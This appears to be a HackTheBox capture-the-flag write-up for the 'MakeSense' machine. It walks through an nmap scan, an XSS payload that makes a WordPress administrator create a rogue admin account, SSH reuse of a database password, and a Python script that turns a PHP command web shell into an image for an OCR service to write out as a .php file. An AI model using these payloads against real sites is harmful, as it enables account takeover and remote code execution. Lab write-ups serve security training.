---
layout: post
title: "HackTheBox Writeup: MakeSense"
thumbnail: "/assets/images/makesense-htb/052cd850a4d49c746c1dade531c8456f_MD5.jpg"
---

In this post, we work through the **MakeSense** machine on HackTheBox. We start by exploiting a Cross-Site Scripting (XSS) vulnerability to force an authenticated administrator to create a rogue admin account for us on a WordPress site. After securing initial access and discovering hardcoded database credentials, we pivot to a local user via SSH. Finally, we escalate to root by exploiting an internal Optical Character Recognition (OCR) service, crafting a custom image that tricks the service into writing a PHP reverse shell to the file system.

---

## 1. Enumeration

We start by running an `nmap` scan against the target to identify open ports and services.

```bash
┌──(mracherr㉿serveur)-[~/tools/envycontrol]
└─$ nmap 10.129.246.24 -sC -sV
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-09-11 14:50 +0200
Nmap scan report for 10.129.246.24
Host is up (0.038s latency).
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58 ((Ubuntu))
...
|_http-generator: WordPress 7.0
```

With port 80 filtered, we focus on HTTPS (443) which is hosting a WordPress 7.0 site. We run a quick directory fuzz using `ffuf`:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/checkPoint/evil1/extension]
└─$ ffuf -w /usr/share/dirb/wordlists/common.txt  -u [https://10.129.246.24/FUZZ](https://10.129.246.24/FUZZ) -fs 0
...
cgi-bin/                [Status: 200, Size: 34965, Words: 5292, Lines: 350, Duration: 1184ms]
wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 912ms]
wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 154ms]
wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 89ms]
```

![Ffuf Output](/assets/images/makesense-htb/6d72b87a3a87b4ecdc66ae54a90a7d39_MD5.jpg)

---

## 2. Initial Access: XSS to Rogue Admin

While enumerating the WordPress site, we discover an area vulnerable to Cross-Site Scripting (XSS). Initially, we attempt to steal an admin cookie using a standard `fetch` payload, but this proves unsuccessful.

Instead, we pivot to a known WordPress exploitation technique: using the XSS vulnerability to force an administrator's browser to silently create a new admin account for us. 

We host the following JavaScript payload locally and trigger it via the XSS vector:

```javascript
u="/wp-admin/user-new.php";
jQuery.get(u,function(e){
  jQuery.post(u,{
    action:"createuser",
    "_wpnonce_create-user":e.match(/_wpnonce_create-user" value="(.+?)"/)[1],
    user_login:"foobar",
    email:"foo@bar.com",
    pass1:"foo",
    pass2:"foo",
    role:"administrator"
  });
});
```

![XSS Execution](/assets/images/makesense-htb/052cd850a4d49c746c1dade531c8456f_MD5.jpg)

The script fetches the required anti-CSRF nonce from the `user-new.php` page and immediately POSTs a request to create a user named `foobar` with the password `foo` and the `administrator` role. 

We log into the `wp-admin` dashboard with our new credentials, upload a malicious plugin/theme containing a PHP payload, and catch a reverse shell as `www-data`!

![WP Admin Dashboard](/assets/images/makesense-htb/64fefaa7749772bb4327edee6af71746_MD5.jpg)

*(Note: During enumeration, we also found an audio file hinting at credentials for a user named Jake (`ClearLightNiceSmooth4923`), but our reverse shell route bypassed the need to use them!)*

---

## 3. Lateral Movement (User: Walter)

Now on the box as `www-data`, we read the `wp-config.php` file to hunt for database credentials.

```php
cat wp-config.php
<?php
// SQLite database configuration
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
```

We discover the password `JbhHDAEgXvri3!` assigned to `walter`. Because users often reuse passwords, we attempt to SSH directly into the machine as `walter`:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/makesense]
└─$ ssh walter@10.129.126.75
walter@10.129.126.75's password:
walter@makesense:~$ cat user.txt
5fb4569317ec0b6ad20c42de7295e95b
```

The credentials work perfectly, and we secure the user flag!

---

## 4. Privilege Escalation: Malicious OCR Image (Root)

Running LinPEAS and investigating running processes reveals some interesting automated tasks. We notice an internal PHP development server running on port `8001` as root, hosting a directory named `ocr4`:

```bash
root        1371  0.0  0.7 228488 30452 ?        S    09:00   0:01  |           _ php -S 127.0.0.1:8001 -t /root/ocr4/
```

We port-forward port 8001 to our attacking machine and investigate the service. It turns out to be an Optical Character Recognition (OCR) application. The application takes an uploaded image, extracts the text using an OCR engine, and saves the extracted text to a user-defined file extension (including `.php`).

To exploit this, we write a Python script that uses the `Pillow` library to generate an image containing a written PHP reverse shell:

```python
import base64
from io import BytesIO
import urllib.parse
from PIL import Image, ImageDraw, ImageFont

# The PHP payload we want the OCR to read
txt = "<?php if (isset($_GET['cmd'])) system($_GET['cmd']);"

# Generate a white image
image = Image.new("RGB", (1400, 300), color=(255, 255, 255))
draw = ImageDraw.Draw(image)

try:
  font = ImageFont.truetype("DejaVuSansMono.ttf", 32)
except IOError:
  font = ImageFont.load_default()

# Write the payload in black text
draw.text((40, 120), txt, fill=(0, 0, 0), font=font)

buffered = BytesIO()
image.save(buffered, format="PNG")
img_str = base64.b64encode(buffered.getvalue()).decode("utf-8")

data_url = f"data:image/png;base64,{img_str}"
print(urllib.parse.quote(data_url, safe=""))
```

![Python OCR Payload Generator](/assets/images/makesense-htb/00ccf31a311efd75628937b207192380_MD5.jpg)

When we submit this generated image to the OCR service and instruct it to save the output as a `.php` file, the OCR engine successfully reads our `<?php...` string and writes it directly into an executable PHP file!

We navigate to the newly created PHP file, execute a reverse shell command via the `?cmd=` parameter, and catch a root shell!

![Root Shell Caught](/assets/images/makesense-htb/fb82b17845d1e996c4aa499f2e1d420e_MD5.jpg)
![Root Flag](/assets/images/makesense-htb/a86ecab78a2c2a4401fac74e3fca479a_MD5.jpg)

Machine completely compromised!